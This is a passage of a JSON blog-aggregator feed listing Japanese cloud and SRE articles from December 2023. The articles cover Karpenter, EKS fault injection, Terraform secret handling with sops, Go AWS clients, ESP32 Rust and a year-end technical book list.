で使う","contentSnippet":"はじめに Kubernetes のノードのオートスケーラーである Karpenter は，Amazon EKS クラスタでの利用を中心に普及しつつあります。 Karpenter を調べてみた・使ってみた系記事はたくさんあ […]The post Karpenter を Amazon EKS で使う first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/karpenter-with-amazon-eks/","isoDate":"2023-12-14T05:17:05.000Z","dateMiliSeconds":1702531025000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Partner Top Engineer 2024 になりました","contentSnippet":"はじめに 今回、ありがたいことに、 Google Cloud Partner Top Engineer 2024(以降PTE)になりましたのでその軌跡をまとめます。 コチラの資料によって PTE になりたい人が増えてくれ […]The post Google Cloud Partner Top Engineer 2024 になりました first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/earn-google-cloud-partner-top-engineer-2024/","isoDate":"2023-12-14T05:15:38.000Z","dateMiliSeconds":1702530938000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AWS Fault Injection Service で EKS の障害テストを行う","contentSnippet":"この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...","link":"https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e","isoDate":"2023-12-13T22:22:00.000Z","dateMiliSeconds":1702506120000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"SREがGoogle Cloud検証環境をCloud Nativeな視点で、 頑張りすぎずでも良い感じに整えた話","contentSnippet":"Jagu\'e\'r - CloudNative分科会 2023/12/13の登壇内容です。","link":"https://speakerdeck.com/parupappa2929/sregagooglecloudjian-zheng-huan-jing-wocloudnativenashi-dian-de-wan-zhang-risugizudemoliang-igan-zinizheng-etahua","isoDate":"2023-12-13T05:00:00.000Z","dateMiliSeconds":1702443600000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更","contentSnippet":"Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...","link":"https://zenn.dev/toversus/articles/88ce2ea66b532d","isoDate":"2023-12-13T00:43:43.000Z","dateMiliSeconds":1702428223000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitHub Actions で multi-platform container image を build して ECR に push する","contentSnippet":"AWS の EKS や ECS では x86_64 も Graviton の arm64 も選択可能です、どちらでも使うかもしれない Container image は multi-platform…","link":"https://qiita.com/yteraoka/items/e1f89d28da4ba5078660","isoDate":"2023-12-12T22:01:45.000Z","dateMiliSeconds":1702418505000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Helmfile でちょっとしたリソースを追加したい","contentSnippet":"動機Helmfile で公式のチャートをインストールしていて，追加で関連リソースを追加したいことがあります。関連リソースの数が多い，内容が環境によって変わるなどの場合は，カスタムチャートを追加することになるでしょう。ただ，そこまで複雑ではない，関連リソースが数個レベルの場合，カスタムチャートだと大げさに感じることがあります。そこでどうすべきか迷っていたところ，同僚の toVersus さんに別の方法を教えていただきました。 extraTemplates 系の変数を使うHelm チャートによっては extraTemplates や extraObjects といった変数が...","link":"https://zenn.dev/toshikish/articles/5ead548816e618","isoDate":"2023-12-11T10:57:21.000Z","dateMiliSeconds":1702292241000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Amazon S3 バケットの terraform destroy に注意","contentSnippet":"TL;DRAmazon S3 バケットを削除する前には，必ずすべてのオブジェクトを削除しよう。aws_s3_bucket リソースの force_destroy 引数 を true にしてもよい。terraform destroy で削除すると，パブリックアクセスできる旨のアラートが出る場合があるので注意しよう。aws_s3_bucket_public_access_block リソースを terraform state rm するとアラートが出ない。マネジメントコンソールから削除してもアラートは出ない。 S3 バケットの terraform dest...","link":"https://zenn.dev/toshikish/articles/190fe076cc63f4","isoDate":"2023-12-11T09:03:06.000Z","dateMiliSeconds":1702285386000,"authorName":"toshikish","authorId":"toshikish"},{"title":"sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメント","contentSnippet":"この記事はこのエントリー以下のアドベントカレンダーの11日目の記事です。3-shake Advent Calendar 2023昨日はtoyb0xによるTODOコメントをチケット管理するためのESLint Custom Ruleでした。PostgreSQL Advent Calendar 2023昨日は@ozozatyによるPostgreSQLのjsonb型でJSONパス式(JSONPath)を使うでした。 はじめにPostgreSQLではDDLはその性質からテーブルレベルでロックを取得してしまいます。SREやPlatform EngineeringなどDev...","link":"https://zenn.dev/nnaka2992/articles/blue_grean_on_postgres_with_sqldeff_and_pgroll","isoDate":"2023-12-10T23:30:00.000Z","dateMiliSeconds":1702251000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"IT勉強会に飯モクおじさん現る","contentSnippet":"cryptocurrency.connpass.com12月9日にビットコインとか忘年会を行いました。参加してくださった皆様ありがとうございました。私は12月に本業がブロックチェーンではなくなったものの、勉強会の運営は引き続きやらせてもらってます。今回の勉強会で楽しい面もありましたが、腹立たしいこともありました。飯モクおじさんが紛れ込んでいたのです。懇親会付きで参加費無料にしていたので、紛れることはしょうがなかったのですが、まさか少人数の勉強会にも紛れ込むとは。LT会をやった後にピザパだったのですが、思い返せば、LT中、飯モクおじさんはスマホをずっといじってましたね。発表内容に興味ないのでしょうね。懇親会開始後、ひたすらピザを食べていて、私は性善説的に、初めてだから話す相手いなくて、食い続けているだけかと思い、話しかけました。私「普段、ブロックチェーンに関する何かやられているんですか？」飯モクおじさん「コンピュータ作っています」と噛み合わない謎返答。私は運営ということもあり、他の方との会話もあって、飯モクおじさんだけに注力できませんでしたが、いつの間にか帰ってました。気付かれずに帰るのは忍者並（苦笑）懇親会中は、飯モクおじさんだけに意識を集中できませんでしたが、時が経つにつれ、腹が立ってきました。blog.shoko.devSHOKO SATOさんの「めし目的人間撲滅委員会の活動報告」というタイトルのブログ記事がバズったばかり。IT勉強会運営の方々は、飯モクおじさんは他人事ではなく、身近にいるものだと思って対策した方がいいかも、特にコロナ明けで、懇親会付きオフライン勉強会が増えたでしょうし。うちの勉強会の運営内で、「交通費使ってまで来てコスパ悪くね？」と話をしていたら、「チャリで来るんじゃないの？都心であればいけるっしょ。」とのこと。チャリで来ているかは分かりませんが、なるほどね（苦笑）タイパ（タイムパフォーマンス）も悪い気がするけど、飯モクおじさんにとっては、こういうことが趣味なのかとも思ったり。うちの勉強会は普段オンラインで、ときどきオフラインイベントをやっています。オフラインだとやっぱり懇親会もつけたい、と思いますが、これからは、飯モク対策しつつ、健全な会にしていきたいと思います。","link":"https://shu-kob.hateblo.jp/entry/2023/12/10/222430","isoDate":"2023-12-10T13:24:30.000Z","dateMiliSeconds":1702214670000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"GolangでSQSのメッセージを取得する","contentSnippet":"キューの取得特に考えることはなくconfig.LoadDefaultConfig()とsqs.NewFromConfig()で取得できるpackage mainimport (\\t\\"context\\"\\t\\"github.com/aws/aws-sdk-go-v2/config\\"\\t\\"github.com/aws/aws-sdk-go-v2/service/sqs\\"\\t\\"log\\")func main() {\\tctx := context.Background()\\tcfg, err := config.LoadDefaultConfig(ctx)\\tif err !...","link":"https://zenn.dev/tayusa/articles/ef4c30c0449a6e","isoDate":"2023-12-10T00:00:01.000Z","dateMiliSeconds":1702166401000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"GitLab CIでKICSを実行する","contentSnippet":"やることTerraformの静的解析を行うKICSの結果をgitlab-commentでMRに出力するhttps://github.com/yuyaban/gitlab-commentKICSの結果を基にMRにReviewdogで指摘するhttps://github.com/reviewdog/reviewdog KICSの実行$ kics scan --config kics.yamlkics.yamlpath: \\".\\" # 解析するTerraformの場所output-path: \\".\\" # 結果の出力先report-formats:...","link":"https://zenn.dev/tayusa/articles/d28865c5ce49c6","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Golangでk8s Deploymentを再起動させる","contentSnippet":"やることclient-goを使って複数のDeploymentを同時に再起動させる Golang Deploymentの取得Pod内であればrest.InClusterConfig()でPodのServiceAccountを使用するconfigを取得できるclientset.AppsV1().Deployments(namespace).Get(ctx, deploymentName, metav1.GetOptions{}) でDeploymentを取得NamespaceとDeploymentの名前が必要k8s.gopackage maini...","link":"https://zenn.dev/tayusa/articles/a7df40b7d6fd5b","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"TypeScript で LangChain の最初の一歩","contentSnippet":"このエントリーは 3-shake Advent Calendar 2023 の10日目の記事です。今年は Python をガッツリ触ったり、 LLM などの方面に手を出してきており、新しいことにまみれております。その中で LLM のシステム作るんだったら Python だろ？っていう中で TypeScript でもちゃんとできるよーっていうことで紹介していきたいと思います。 私が、あんまり Python でアプリ作っていくのが好きじゃないのもありますもちろん、 Python よりも TypeScript のほうが機能が少なめではありますので、そのあたりは、目をつぶっております。今...","link":"https://zenn.dev/satohjohn/articles/9415f85be332e6","isoDate":"2023-12-09T15:00:00.000Z","dateMiliSeconds":1702134000000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Mastering Bitcoin Third Editionの紹介","contentSnippet":"https://cryptocurrency.connpass.com/event/303416/\\r2023年12月9日(土)ビットコインとか忘年会のLTで、同年11月に出版されたMastering Bitcoin Third Editionの紹介をしました。","link":"https://speakerdeck.com/shukob/mastering-bitcoin-third-editionnoshao-jie","isoDate":"2023-12-09T05:00:00.000Z","dateMiliSeconds":1702098000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"今よりちょっとだけ上手く文章を書くコツ","contentSnippet":"この記事は、3-shake Advent Calendar 2023 9日目のエントリ記事です。技術的な話ではありませんはじめに国語がとても苦手だった私は、社会人になったときに日本語力の無さに…","link":"https://qiita.com/kojake_300/items/c5def031a252323fae1c","isoDate":"2023-12-08T22:01:43.000Z","dateMiliSeconds":1702072903000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか","contentSnippet":"qiita.comこの記事は、3-shake Advent Calendar 2023の9日目の記事となります。sops プロバイダーとは本当に安心?ドキュメントを調べる挙動を実験する結論ワークアラウンドsops プロバイダーとはcarlpett/terraform-provider-sops: A Terraform provider for reading Mozilla sops filesDocs overview | carlpett/sops | Terraform | Terraform RegistrysopsプロバイダーはMozilla sopsを使用して暗号化されたファイルから機密情報を取り出して、terraform上で使用できるようにしたものです。暗号化の鍵をAWS KMS等を使うことにより、KMSキーを使う権限を持つ人だけ機密情報にアクセスできるようにするものです。sopsで機密情報を暗号化することにより、平文で機密情報をgitレポジトリに保存することがなくなり安全ということになります。機密情報を管理したい。でも平文では保存したくない。そういう用途にこちらは使用されます。本当に安心?SOPSを使って機密情報を暗号化することによりgitレポジトリには機密情報が平文で残らない。これで安心と言われていますが、よく考えると機密情報をterraform実行時にはリソースに対して平文で与えているはずです。つまり、tfstate上は機密情報が平文で保存されています。例えば、tfstateがS3に保存されているとして、KMSキーへの権限がない人でもS3バケットにアクセスする権限があれば、平文の機密情報が見れてしまいます。あまりないと思いますが、tfstateをlocalに保存するようにしていてそれをgit管理していてらなんのために暗号化しているのか。。。。ということになります。こう考えると組織のポリシーによるが、sopsプロバイダーによる暗号化では不十分ではないかという疑問が生まれます。ドキュメントを調べるまずプロバイダードキュメントを当たってみます。Docs overview | carlpett/sops | Terraform | Terraform RegistryTo prevent plaintext secrets from being written to disk, you\xa0must\xa0use a secure remote state backend. See the\xa0official docs\xa0on\xa0Sensitive Data in State\xa0for more information.これが意味してるのはバックエンドをlocalにした場合平文で機密情報が書かれるので、安全なリモートバックエンドを利用すべきということだと思います。State: Sensitive Data | Terraform | HashiCorp Developer参照しろと言われたドキュメントの該当部分を読んでみましょう。ローカルディスクにtfstateを保存した場合は、機密情報が平文で保存されます。リモートにtfstateを保存する場合、保存時に暗号化されるかはバックエンドに依存します。基本的にリモートステートを使うことを推奨しています。例えば、Terraform Cloudを使う場合、tfstateは暗号化され、転送時もTLSで暗号化されます。S3を使う場合もSSE-S3やSSE-KMS等でサーバサイド暗号化を有効にしておくことで、保管時の暗号化がされます。バケットポリシーでHTTPSを強制することで通信時の暗号化も保証することができます。参考: 暗号化によるデータの保護 - Amazon Simple Storage Service参考: Amazon S3 のセキュリティのベストプラクティス - Amazon Simple Storage Serviceところがですね。保存時、通信時の暗号化をしても、terraform state pullすると平文でtfstateが手に入ってしまうんですよ。。。後述します。挙動を実験する以下のような設定ファイルを作ります。sopsで暗号化したdb_userとdb_passwordをパラメータストアに設定するものになります。tools-versionsterraform 1.5.5sops 3.7.3main.tfterraform {  required_version = \\"~> 1.5.5\\"  required_providers {    aws = {      source  = \\"hashicorp/aws\\"      version = \\"~> 5.15\\"    }    sops = {      source  = \\"carlpett/sops\\"      version = \\"~> 0.7.2\\"    }  }  backend \\"s3\\" {    region  = \\"ap-northeast-1\\"    bucket  = \\"xxxxxxxxxx\\"    key     = \\"test.tfstate\\"  }}provider \\"sops\\" {}provider \\"aws\\" {  region = \\"ap-northeast-1\\"}data \\"sops_file\\" \\"secrets\\" {  source_file = \\"secrets.yaml\\"}resource \\"aws_ssm_parameter\\" \\"db_user\\" {  type     = \\"String\\"  name     = \\"/test/db_user\\"  value    = data.sops_file.secrets.data.db_user}resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    = data.sops_file.secrets.data.db_password}暗号化前の secrets.yamldb_user: userdb_password: passwordapply結果がこちらとなります。terraform apply% export SOPS_KMS_ARN=arn:aws:kms:ap-northeast-1:xxxxxxxxx:key/yyyyyyyyyyyyyyyyyy% terraform applydata.sops_file.secrets: Reading...data.sops_file.secrets: Read complete after 1s [id=-]Terraform used the selected providers to generate the following execution plan. Resource actions areindicated with the following symbols:  + createTerraform will perform the following actions:  # aws_ssm_parameter.db_password will be created  + resource \\"aws_ssm_parameter\\" \\"db_password\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_password\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"SecureString\\"      + value          = (sensitive value)      + version        = (known after apply)    }  # aws_ssm_parameter.db_user will be created  + resource \\"aws_ssm_parameter\\" \\"db_user\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_user\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"String\\"      + value          = (sensitive value)      + version        = (known after apply)    }Plan: 2 to add, 0 to change, 0 to destroy.Do you want to perform these actions?  Terraform will perform the actions described above.  Only \'yes\' will be accepted to approve.  Enter a value: yesaws_ssm_parameter.db_password: Creating...aws_ssm_parameter.db_user: Creating...aws_ssm_parameter.db_user: Creation complete after 0s [id=/test/db_user]aws_ssm_parameter.db_password: Creation complete after 0s [id=/test/db_password]Apply complete! Resources: 2 added, 0 changed, 0 destroyed.terraform apply  8.91s user 0.78s system 124% cpu 7.811 totalstate showするとパラメータストアなのでsensitive扱いになっていて、見れません。これはいけるか?terraform state show% terraform state show aws_ssm_parameter.db_password# aws_ssm_parameter.db_password:resource \\"aws_ssm_parameter\\" \\"db_password\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\"    data_type = \\"text\\"    id        = \\"/test/db_password\\"    key_id    = \\"alias/aws/ssm\\"    name      = \\"/test/db_password\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"SecureString\\"    value     = (sensitive value)    version   = 1}% terraform state show aws_ssm_parameter.db_user    # aws_ssm_parameter.db_user:resource \\"aws_ssm_parameter\\" \\"db_user\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_user\\"    data_type = \\"text\\"    id        = \\"/test/db_user\\"    name      = \\"/test/db_user\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"String\\"    value     = (sensitive value)    version   = 1}ここで、terraform state pullをしてみて、tfstateファイルをローカルにダウンロードします。そのtfstateファイルの中の該当部分はこちらとなります。    {      \\"mode\\": \\"managed\\",      \\"type\\": \\"aws_ssm_parameter\\",      \\"name\\": \\"db_password\\",      \\"provider\\": \\"provider[\\\\\\"registry.terraform.io/hashicorp/aws\\\\\\"]\\",      \\"instances\\": [        {          \\"schema_version\\": 0,          \\"attributes\\": {            \\"allowed_pattern\\": \\"\\",            \\"arn\\": \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\",            \\"data_type\\": \\"text\\",            \\"description\\": \\"\\",            \\"id\\": \\"/test/db_password\\",            \\"insecure_value\\": null,            \\"key_id\\": \\"alias/aws/ssm\\",            \\"name\\": \\"/test/db_password\\",            \\"overwrite\\": null,            \\"tags\\": null,            \\"tags_all\\": {},            \\"tier\\": \\"Standard\\",            \\"type\\": \\"SecureString\\",            \\"value\\": \\"password\\",            \\"version\\": 1          },          \\"sensitive_attributes\\": [            [              {                \\"type\\": \\"get_attr\\",                \\"value\\": \\"value\\"              }            ]          ],          \\"private\\": \\"bnVsbA==\\",          \\"dependencies\\": [            \\"data.sops_file.secrets\\"          ]        }      ]    },tfstateファイルの中身をよく確認するとしっかり平文で見えています。残念。\\"value\\": \\"password\\",結論sopsプロバイダーを使用することによりgitレポジトリ上に機密情報を平文で保存することはなくなります。しかしながら、tfstateのデータ上では設定値が平文で保存されることを防ぐことはできません。terraform state pullする権限があれば、機密情報が見れてしまいます。運用組織のポリシーで、tfstateへのアクセス権限を適切に権限管理することができるのであれば、選択肢としては取りうります。暗号化のためのKMSキー、tfstateを保存するS3バケットを機密情報をアクセス可能な人のみ権限を与えることが徹底できればよいです。しかしながら、機密情報をいかなる場合でもローカルに平文で保存することが許容されない組織であれば、機密情報は手動で設定することを選択したほうが望ましいと思います。どうしても機密情報をterraformで管理したのであれば、クライアントサイドで暗号化した機密情報をterraformで管理し、アプリ等で使用時にクライアントサイドで復号を行う形も考えられます。安全かどうかは、tfstateの保存場所、tfstateへのアクセス権限、暗号化鍵のアクセス権限それぞれが適切に設定されているかどうかが鍵となります。他に何かうまい方法で機密情報を管理しているという方がいらっしゃれば、ご意見ください。ワークアラウンドこれは自分がよく使う手段となります。リソースの箱だけ作って、作成時にダミーの値を入れておき、実際の値は手動で設定するという手法です。ignore_changesを入れておくことで、手動で値を変更しても、terraform的には差分ができないようにしています。これにより、機密情報をterraformの外に追い出しつつも、機密情報を入れるリソース自体は監理するということが実現できます。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}","link":"https://blog.masasuzu.net/entry/2023/12/09/014230","isoDate":"2023-12-08T16:42:30.000Z","dateMiliSeconds":1702053750000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"はんだ付けから始めるEmbedded Rust on Espressif(3)","contentSnippet":"prometheusで値を取得する前回まででESP32をWifiに接続してDHT11から温湿度を返す簡単なAPIサーバが作成できました。JSONを返すのを変更してprometheusでmetricsを取得できるように変更してみます。HTTPのハンドラ部分のURLを/からmetricsにしてpromethuesの書式を返すように変更しました。    let mut server = EspHttpServer::new(&Configuration::default())?;    server.fn_handler(\\"/metrics\\", Method::Get, ...","link":"https://zenn.dev/satoken/articles/rust-on-esp3","isoDate":"2023-12-07T16:40:18.000Z","dateMiliSeconds":1701967218000,"authorName":"satoken","authorId":"satoken"},{"title":"はんだ付けから始めるEmbedded Rust on Espressif(2)","contentSnippet":"温湿度の取得前回まではLEDを光らせてきました。光り物はもう十分なので他のことをやります。これは温湿度が取得できるDHT11センサーです。これを利用して温湿度を取得してみます。https://akizukidenshi.com/catalog/g/gM-07003/以下のように回路を組みます。ちょうど同じことをやっている方がいるので新しくプロジェクトを作成してそのままコードをコピペします。https://www.youtube.com/watch?v=5qYswqbZUDshttps://github.com/shanemmattner/ESP32-C3_Rus...","link":"https://zenn.dev/satoken/articles/rust-on-esp2","isoDate":"2023-12-06T15:45:17.000Z","dateMiliSeconds":1701877517000,"authorName":"satoken","authorId":"satoken"},{"title":"エンプラ企業におけるK8s DrivenなCloudNative Journeyを思う年の瀬","contentSnippet":"このエントリーは 以下のアドベントカレンダーの記事です3-shake Advent Calendar 2023 ：7日目Kubernetes Advent Calendar 2023 : 8日目 背景現在、エンプラ企業のお客さんに対してSREとしてCloudNativeな技術やk8sを使用して支援を行なっているがその中でkubernetesそもそもの利用について少し考える機会があった。k8sにおける技術的・組織的課題はどの組織においてもあるが、ステークホルダーが多岐にわたるエンプラ企業ではその課題はさらに多くなり、また解決も難しくなる。課題に対して深く長く向き合うほ...","link":"https://zenn.dev/yokoo_an209/articles/4ce4ce0d795239","isoDate":"2023-12-06T11:01:49.000Z","dateMiliSeconds":1701860509000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"AlloyDB omni on Kubernetesを眺める","contentSnippet":"このエントリーは以下のアドベントカレンダーの6日目の記事です。3-shake Advent Calendar 2023 シリーズ1昨日は@bells17さんによるChainguard imagesについて調べてみたでした。PostgreSQL Advent Calendar 2023 シリーズ2Kubernetes Advent Calendar 2023昨日は@yassan168さんによるRKE2ノードのCiliumを使ったeBPFな帯域制限をする話でした。 背景を眺める2023年10月12日にAlloyDB OmniのGAに併せてAlloyDB Omni o...","link":"https://zenn.dev/nnaka2992/articles/viewing_alloydb_omni_operator","isoDate":"2023-12-05T23:30:00.000Z","dateMiliSeconds":1701819000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"はんだ付けから始めるEmbedded Rust on Espressif","contentSnippet":"はじめに突然ですがここに秋月電子で購入したESP32-C3があります。1個310円と他のESP32と比べても安価でCPUにRISC-Vを使ったチップです。https://akizukidenshi.com/catalog/g/gM-17493/以下のドキュメントはESP32シリーズを製造しているEspressifによるRustのハンズオンドキュメントです。今回これを読みながらESP32-C3でRustを動かして遊んでみます。Embedded Rust on EspressifThe Rust on ESP BookESP32単体ではPCと接続してプログラムを書き込め...","link":"https://zenn.dev/satoken/articles/rust-on-esp1","isoDate":"2023-12-05T16:22:25.000Z","dateMiliSeconds":1701793345000,"authorName":"satoken","authorId":"satoken"},{"title":"Chainguard imagesについて調べてみた","contentSnippet":"※この記事は3-shake Advent Calendar 2023 シリーズ1の12月5日の記事です最近Chainguard imagesというdistrolessコンテナイメージについて知ったので、簡単に調べてみました。 Chainguard imagesとは？Chainguard imagesはChainguard社によって提供されているdistrolessを中心としたセキュアなコンテナイメージ群だ、という理解です。Wolfiという(おそらくこれもChainguard社が開発している)コンテナ・クラウドネイティブ用途向けのLinux undistroなOSを利用して各C...","link":"https://zenn.dev/bells17/articles/chainguard-images","isoDate":"2023-12-05T03:58:09.000Z","dateMiliSeconds":1701748689000,"authorName":"bells17","authorId":"bells17"},{"title":"ECSの可用性設計を4つの軸で整理する","contentSnippet":"はじめに こんにちは！Sreake事業部 志羅山です。今年3月に3-shakeに入社し、長野県からリモートで仕事をしています（東京にも定期的に行ってます）。 最近、とあるお客様環境におけるECS（AWSのフルマネージド型 […]The post ECSの可用性設計を4つの軸で整理する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/ecs-availability-4-factors/","isoDate":"2023-12-05T02:48:59.000Z","dateMiliSeconds":1701744539000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Cloud Loggingについて","contentSnippet":"whatGoogle CloudのCloud Loggingについて基本概要など調べたことをまとめる適宜追記予定 Cloud Loggingとはhttps://cloud.google.com/logging/docs/overview?hl=jaGoogleCloud上のシステム等が生成したログを収集・保管・管理するための仕組み。基本的にGoogleCloud上のサービスが出力するログはCloud Loggingへと集められる。収集されたログはログバケットと呼ばれるストレージで保管され、期間が過ぎたら破棄するといった設定を行うことが可能。ログはコンソールのログ...","link":"https://zenn.dev/nedoko_dok0dko/articles/ef07acbb983d01","isoDate":"2023-12-04T11:05:41.000Z","dateMiliSeconds":1701687941000,"authorName":"seno","authorId":"seno"},{"title":"吉祥寺.pm35 でLTしてきました。 #kichijojipm","contentSnippet":"吉祥寺.pm こと 句会吉祥寺.pm35 に参加して、LTしてきました。kichijojipm.connpass.com資料はこちら。言いたいこととしてはベストプラクティスなんてないよ。一般的によりよいプラクティスやパターンはあるけど、どんなときには適用できる銀の弾丸的なものはないから、自身の組織とサービスに合わせてくみ上げていきましょうということ。正解はひとつ!じゃない!!その上で、ざっくりとどんな選択肢と選択するための観点を述べていきました。まだ全然ブラッシュアップできるのでどこかでまとめてブログに書きたいところです。ちなみに最後に出てくる あなたらしく○○ は同僚のスライドのパロディです。毎回時間オーバーするのでトークで申し込んだ方が良いのでは?というツッコミはごもっともです。懇親会でもTerraformのお悩みとか短いですが話せて楽しかったです。また参加したいですね。","link":"https://blog.masasuzu.net/entry/2023/12/03/161754","isoDate":"2023-12-03T07:17:54.000Z","dateMiliSeconds":1701587874000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Auroraアップグレード時のBlue/Green Deploymentsの利用","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 4日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめにAmazon Aurora2系について、標準サポート終了日(2024/10/31)まで1年を切りました。依然として、Aurora2系を利用しているシステムは多いのではないでしょうか。アプリケーションのテストや検証を考えると早めに動いていかなければならない時期となりました。本記事では、アップグレード方式・方針の一つとして、AWSからも推奨されているRDS Blue/Green Deplo...","link":"https://zenn.dev/hakushou41/articles/70b83066cd1741","isoDate":"2023-12-03T07:12:32.000Z","dateMiliSeconds":1701587552000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"Playwright Test generatorを利用したE2Eテスト ことはじめ","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 3日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに現在、私はマイクロサービスを運用するSREを支援する人として活動しています。運用チームやSREが主導となって実施するメンテナンスやアップデート作業などでは、アップデート後の動作確認として、ブラウザを介したWebアプリケーションの簡易目視確認をします。これらの確認項目は、手順書へ項目を記載し、必要に応じてエビデンスをスクリーンショットで取得する必要があります。確認作業を網羅的にしようとす...","link":"https://zenn.dev/hakushou41/articles/65bc815b14354f","isoDate":"2023-12-02T15:00:00.000Z","dateMiliSeconds":1701529200000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"2023年 俺が愛した本たち 技術書編","contentSnippet":"この記事は、3-shake Advent Calendar 2023 2日目のエントリ記事です。はじめに2023年がそろそろ幕を閉じようとしています。年末に差し掛かると、時間が流れる水のように止まらないことを感じながら、過ぎ去った一年を振り返るのは、私にとって欠かせない習慣です。この一年も、技術書の海に身を投じて、多くの本に心を奪われ、狂気のような積読を重ねました。積めば技術力が向上すると信じている。現代科学では解明できない電波が(諸説あり)積み上がった本からは出ていてこれらが私の知識の山となりました。が、来年はこの山を一歩一歩登り、購入する本の数を読む本の数に下回らせることを心に誓います。2023年は、特に技術の世界で学びは終わりがないことを実感した年でした。読書を通じて得た知識と経験は、来年もまた新たな知識の旅へと私を導くでしょう。昨年の読んだ本syu-m-5151.hatenablog.comはじめに有用情報2023年に読んでよかった技術書サイトリライアビリティワークブックSoftware Requirements Essentialsシステム障害対応 実践ガイドコンテナセキュリティTerraform: Up and Running, 3rd EditionEfficient GoKubernetes Best Practices, 2nd Editionルールズ・オブ・プログラミングさいごに有用情報昨年惜しまれつつ終了したACM会員特典、O\'Reilly Online Learningの読み放題サブスクが、2023年に復活しました！これは大きなニュースですね。新しい年間料金は＄174と少々お高くなってしまいましたが、通常の＄499と比較するとかなりの節約です。ちなみに、私は5月に＄499でこのサブスクを手に入れました。興味がある方は、ACM登録ページより登録が可能です。ACM Professional Membership（年間＄99）にACM Skills Bundle Add-On（追加＄75）を組み合わせることで、O\'Reilly Online Learning、Skillsoft Percipioのeラーニング、PluralsightのIT技術学習プラットフォームといった3つの学習コンテンツのサブスクを登録できます。2023年に読んでよかった技術書2023年は、読書から得た知識をソフトウェアエンジニアとしての実務経験に結びつけ、いくつかのイベントで登壇する機会に恵まれました。これらの登壇では、本で学んだ理論やアイデアを実際の業務に応用し、それらを共有することで得られた知見が非常に貴重なものでした。今後も、この経験を活かして、より多くの人々と知識を共有し、相互に学び合う機会を創出していきたいと考えています。また、2023年に私が特に愛読した本を紹介し、読書を通じたさらなる知見の共有を図っていく予定です。これらの本が、皆さんの技術的な成長や新しい洞察を得るための一助となれば幸いです。speakerdeck.comサイトリライアビリティワークブック『サイトリライアビリティワークブック ―SREの実践方法』は、『SRE サイトリライアビリティエンジニアリング』の実践編として、SRE（サイトリライアビリティエンジニアリング）を組織やプロジェクトに導入する際に必要な具体的な方法や手順を詳しく解説した本です。Google内部での技術的ノウハウに加え、Evernote、The Home Depot、New York 